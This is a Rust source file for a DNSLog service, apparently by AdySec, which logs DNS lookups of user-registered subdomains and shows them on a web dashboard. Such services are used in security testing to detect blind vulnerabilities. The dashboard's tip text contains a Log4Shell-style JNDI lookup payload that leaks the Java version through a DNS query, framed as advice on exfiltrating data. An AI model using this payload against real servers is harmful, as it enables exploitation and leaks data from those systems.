use actix_web::{web, App, HttpResponse, HttpServer, Responder, HttpRequest};
use async_trait::async_trait;
use chrono::Local;
use chrono::TimeZone;
use rand::{distributions::Alphanumeric, Rng};
use rusqlite::{params, OptionalExtension};
use r2d2::Pool;
use r2d2_sqlite::SqliteConnectionManager;
use serde::Serialize;
use std::collections::HashMap;
use tokio::net::UdpSocket;
use trust_dns_server::authority::MessageResponseBuilder;
use trust_dns_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture};
use trust_dns_proto::op::ResponseCode;

#[derive(Debug, Serialize)]
struct LogRecord {
    // 显示实际请求的完整域名
    domain: String,
    client_ip: String,
    timestamp: String,
}

#[derive(Serialize)]
struct SubdomainLogs {
    subdomain: String, // 注册的子域名，用于分组
    logs: Vec<LogRecord>,
}

#[derive(Serialize)]
struct NewSubResponse {
    new_sub: String,
    subdomains: Vec<String>,
}

// DNS 请求处理器：收到 DNS 请求时判断查询的域名是否匹配已注册子域名（允许前缀扩展）
struct MyDnsHandler {
    pool: Pool<SqliteConnectionManager>,
}

#[async_trait]
impl RequestHandler for MyDnsHandler {
    async fn handle_request<R: ResponseHandler>(
        &self,
        request: &Request,
        mut response_handle: R,
    ) -> ResponseInfo {
        // 获取 DNS 查询的域名，去除末尾的点并转换为小写
        let query = request.query();
        let query_name = query.name().to_string();
        let normalized_query = query_name.trim_end_matches('.').to_lowercase();
        let client_ip = request.src().ip().to_string();
        // 使用 Unix 时间戳（秒）
        let timestamp = Local::now().timestamp();

        let pool = self.pool.clone();
        tokio::task::spawn_blocking(move || {
            let conn = pool.get().expect("Failed to get DB connection");
            // 如果查询域名等于注册域名或以 ".{注册域名}" 结尾，则匹配成功
            let result: Option<(String, String)> = conn
                .query_row(
                    "SELECT user_token, subdomain FROM subdomains 
                     WHERE ?1 = subdomain OR ?1 LIKE '%.' || subdomain",
                    params![normalized_query.clone()],
                    |row| Ok((row.get(0)?, row.get(1)?)),
                )
                .optional()
                .expect("DB query failed");
            if let Some((_user_token, registered_sub)) = result {
                println!(
                    "DNS Query matched registered subdomain: {} (requested: {}) from {}",
                    registered_sub, normalized_query, client_ip
                );
                // 插入日志时同时保存注册子域名和实际请求的完整域名
                let _ = conn.execute(
                    "INSERT INTO logs (registered_subdomain, requested_domain, client_ip, timestamp) VALUES (?1, ?2, ?3, ?4)",
                    params![registered_sub, normalized_query, client_ip, timestamp],
                );
            } else {
                println!(
                    "DNS Query for unregistered domain: {} from {}",
                    normalized_query, client_ip
                );
            }
        })
        .await
        .expect("spawn_blocking failed");

        let response = MessageResponseBuilder::from_message_request(request)
            .error_msg(request.header(), ResponseCode::NXDomain);
        let info = response_handle
            .send_response(response)
            .await
            .expect("failed to send response");
        info
    }
}

// 生成随机小写字符串
fn random_string(len: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect::<String>()
        .to_lowercase()
}

/// 自动注册新用户：当 URL 无 token 时调用，返回生成的 token  
/// 同时存储用户访问 IP（access_ip）到 users 表中
async fn auto_register(pool: &Pool<SqliteConnectionManager>, access_ip: String) -> String {
    let token = random_string(16);
    let default_sub = format!("{}.dnslog.adysec.com", random_string(8));
    let pool_clone = pool.clone();
    let token_for_closure = token.clone();
    tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().expect("Failed to get DB connection");
        // 插入 token 及访问 IP
        conn.execute("INSERT INTO users (token, access_ip) VALUES (?1, ?2)", params![token_for_closure.clone(), access_ip])
            .expect("Failed to insert user");
        conn.execute(
            "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
            params![token_for_closure, default_sub],
        )
        .expect("Failed to insert subdomain");
    })
    .await
    .expect("spawn_blocking failed");
    token
}

/// 仪表盘页面（根路径 "/"）：整合所有功能，不暴露其他 API 接口
async fn dashboard(
    req: HttpRequest,
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    // 尝试从请求中获取用户 IP，如果无法获取则使用 "unknown"
    let access_ip = req.connection_info().realip_remote_addr().unwrap_or("unknown").to_string();

    // 如果 URL 中没有 token，则自动注册，并存储访问 IP
    let token = if let Some(t) = query.get("token") {
        t.to_string()
    } else {
        auto_register(&pool, access_ip).await
    };

    let html = format!(r#"
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>DNSLog Dashboard</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background-color: #eef2f7;
                margin: 0;
                padding: 20px;
            }}
            .container {{
                max-width: 900px;
                margin: 0 auto;
                background: #fff;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.15);
            }}
            h1 {{
                color: #2c3e50;
                margin-bottom: 10px;
            }}
            h2, h3 {{
                color: #34495e;
            }}
            button {{
                background-color: #3498db;
                color: #fff;
                border: none;
                padding: 12px 24px;
                cursor: pointer;
                border-radius: 4px;
                font-size: 16px;
                margin-bottom: 20px;
            }}
            button:hover {{
                background-color: #2980b9;
            }}
            table {{
                width: 100%;
                border-collapse: collapse;
                margin-top: 10px;
            }}
            th, td {{
                border: 1px solid #bdc3c7;
                padding: 10px;
                text-align: left;
            }}
            th {{
                background-color: #ecf0f1;
            }}
            ul {{
                list-style: none;
                padding: 0;
            }}
            li {{
                background: #ecf0f1;
                margin: 5px 0;
                padding: 10px;
                border-radius: 4px;
            }}
            .tip {{
                background-color: #fdf6e3;
                border-left: 4px solid #f1c40f;
                padding: 15px;
                margin: 20px 0;
                font-size: 14px;
                color: #7f8c8d;
            }}
            .footer {{
                margin-top: 40px;
                font-size: 12px;
                color: #95a5a6;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>DNSLog Dashboard</h1>by AdySec
            <p>Your token: <strong>{token}</strong></p>
            <button id="newSubBtn">申请新子域名</button>
            <div id="subdomainsContainer"></div>
            <h2>DNS Log Records (最近1小时)</h2>
            <div id="logsContainer">Loading logs...</div>
            <div class="tip">
                dnslog记录自动刷新，无需手动刷新页面<br>
                DNS服务器分为递归和迭代查询两种模式，因此获取到的连接IP可能不准确<br><br>
                使用提示：为确保能够准确捕获并传输关键数据，建议将需要外传的信息嵌入域名的中间部分，例如：<br>
                <code>${{jndi:ldap://test.${{java:version}}.domain}}</code><br>
            </div>
            <div class="footer">
                &copy; AdySec
            </div>
        </div>
        <script>
            async function fetchLogs() {{
                try {{
                    const res = await fetch('/api/logs?token={token}');
                    const data = await res.json();
                    let html = '';
                    data.forEach(item => {{
                        html += `<h3>Registered Subdomain: ${{
                            item.subdomain
                        }}</h3>`;
                        if(item.logs.length > 0) {{
                            html += '<table><tr><th>Requested Domain</th><th>IP Address</th><th>Timestamp</th></tr>';
                            item.logs.forEach(log => {{
                                html += `<tr><td>${{log.domain}}</td><td>${{log.client_ip}}</td><td>${{log.timestamp}}</td></tr>`;
                            }});
                            html += '</table>';
                        }} else {{
                            html += '<p>No logs for this subdomain in the last hour.</p>';
                        }}
                    }});
                    document.getElementById('logsContainer').innerHTML = html;
                }} catch (error) {{
                    console.error('Error fetching logs:', error);
                }}
            }}

            async function fetchSubdomains() {{
                try {{
                    const res = await fetch('/api/logs?token={token}');
                    const data = await res.json();
                    let html = '<h2>Your Subdomains</h2><ul>';
                    data.forEach(item => {{
                        html += `<li>${{item.subdomain}}</li>`;
                    }});
                    html += '</ul>';
                    document.getElementById('subdomainsContainer').innerHTML = html;
                }} catch (error) {{
                    console.error('Error fetching subdomains:', error);
                }}
            }}

            document.getElementById('newSubBtn').addEventListener('click', async () => {{
                try {{
                    const res = await fetch('/api/newsub?token={token}', {{
                        method: 'POST'
                    }});
                    const data = await res.json();
                    alert('新子域名创建成功: ' + data.new_sub);
                    fetchLogs();
                    fetchSubdomains();
                }} catch (error) {{
                    console.error('Error creating new subdomain:', error);
                }}
            }});

            // 初始加载
            fetchLogs();
            fetchSubdomains();
            // 每 5 秒刷新日志
            setInterval(fetchLogs, 5000);
        </script>
    </body>
    </html>
    "#, token = token);
    HttpResponse::Ok().content_type("text/html").body(html)
}

/// API：申请新子域名，返回新子域名及当前所有子域名列表（POST 请求）
async fn newsub_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().body("缺少 token 参数"),
    };

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking({
        let token_for_query = token.clone();
        move || {
            let conn = pool_clone.get().expect("Failed to get DB connection");
            let exists: Option<String> = conn
                .query_row(
                    "SELECT token FROM users WHERE token = ?1",
                    params![token_for_query.clone()],
                    |row| row.get(0),
                )
                .optional()
                .expect("Failed to query user");
            if exists.is_none() {
                return Err("User not found".to_string());
            }
            let new_sub = format!("{}.dnslog.adysec.com", random_string(8));
            conn.execute(
                "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
                params![token_for_query.clone(), new_sub.clone()],
            )
            .expect("Failed to insert new subdomain");
            let mut stmt = conn
                .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
                .expect("Failed to prepare stmt");
            let sub_iter = stmt
                .query_map(params![token_for_query.clone()], |row| row.get::<_, String>(0))
                .expect("Failed to query subdomains");
            let mut subdomains: Vec<String> = Vec::new();
            for s in sub_iter {
                subdomains.push(s.expect("Failed to get subdomain"));
            }
            Ok((new_sub, subdomains))
        }
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok((new_sub, subdomains)) => {
            HttpResponse::Ok().json(NewSubResponse { new_sub, subdomains })
        },
        Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e)),
    }
}

/// API：获取指定 token 下各子域名的 DNS 日志（GET 请求），仅返回最近1小时的数据
async fn get_logs_json(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().body("缺少 token 参数"),
    };

    let pool_clone = pool.get_ref().clone();
    let token_for_query = token.clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let mut stmt = conn
            .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
            .map_err(|e| e.to_string())?;
        let sub_iter = stmt
            .query_map(params![token_for_query.clone()], |row| row.get::<_, String>(0))
            .map_err(|e| e.to_string())?;
        let mut data: Vec<SubdomainLogs> = Vec::new();
        // 计算1小时前的时间戳
        let now = Local::now().timestamp();
        let cutoff = now - 3600;
        for sub in sub_iter {
            let sub: String = sub.map_err(|e| e.to_string())?;
            let mut stmt = conn
                .prepare("SELECT requested_domain, client_ip, timestamp FROM logs WHERE registered_subdomain = ?1 AND timestamp >= ?2 ORDER BY id DESC")
                .map_err(|e| e.to_string())?;
            let log_iter = stmt
                .query_map(params![sub.clone(), cutoff], |row| {
                    let ts: i64 = row.get(2)?;
                    let dt = Local.timestamp_opt(ts, 0).single().unwrap();
                    let formatted = dt.format("%Y-%m-%d %H:%M:%S").to_string();
                    Ok(LogRecord {
                        domain: row.get(0)?,
                        client_ip: row.get(1)?,
                        timestamp: formatted,
                    })
                })
                .map_err(|e| e.to_string())?;
            let mut logs: Vec<LogRecord> = Vec::new();
            for log in log_iter {
                logs.push(log.map_err(|e| e.to_string())?);
            }
            data.push(SubdomainLogs { subdomain: sub, logs });
        }
        Ok(data)
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok(data) => HttpResponse::Ok().json(data),
        Err(e) => HttpResponse::InternalServerError().body(e),
    }
}

#[tokio::main]
async fn main() -> std::io::Result<()> {
    // 创建 SQLite 连接池，数据库文件为 dnslog.db
    let manager = SqliteConnectionManager::file("dnslog.db");
    let pool = Pool::new(manager).expect("Failed to create DB pool");

    // 初始化数据库表，去掉 AUTOINCREMENT 以避免创建 sqlite_sequence 表
    {
        let conn = pool.get().expect("Failed to get DB connection");
        conn.execute_batch(
            r#"
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                token TEXT NOT NULL UNIQUE,
                access_ip TEXT
            );
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY,
                user_token TEXT NOT NULL,
                subdomain TEXT NOT NULL,
                UNIQUE(user_token, subdomain)
            );
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY,
                registered_subdomain TEXT NOT NULL,
                requested_domain TEXT NOT NULL,
                client_ip TEXT NOT NULL,
                timestamp INTEGER NOT NULL
            );
            CREATE INDEX IF NOT EXISTS "registered_subdomain" ON "logs" ("registered_subdomain");
            CREATE INDEX IF NOT EXISTS "timestamp" ON "logs" ("timestamp");
            PRAGMA journal_mode = WAL;
            "#
        )
        .expect("Failed to create tables");
    }

    // DNS 服务器：监听 53 端口
    let pool_for_dns = pool.clone();
    let dns_server = tokio::spawn(async move {
        let socket = UdpSocket::bind("0.0.0.0:53")
            .await
            .expect("Failed to bind DNS socket");
        let mut server = ServerFuture::new(MyDnsHandler { pool: pool_for_dns });
        server.register_socket(socket);
        server.block_until_done().await.expect("DNS server error");
    });

    // 启动 Web 服务器，监听 8888 端口，所有功能整合在根路径 "/"
    let pool_for_web = pool.clone();
    let web_server = HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(pool_for_web.clone()))
            .route("/", web::get().to(dashboard))
            .route("/api/newsub", web::post().to(newsub_api))
            .route("/api/logs", web::get().to(get_logs_json))
    })
    .bind("0.0.0.0:8888")?
    .run();

    // 监听 Ctrl+C 信号，实现优雅退出
    tokio::select! {
        _ = tokio::signal::ctrl_c() => {
            println!("Ctrl+C received, shutting down gracefully.");
        },
        res = web_server => {
            res?;
        }
    }

    // 停止 DNS 服务器任务
    dns_server.abort();

    Ok(())
}

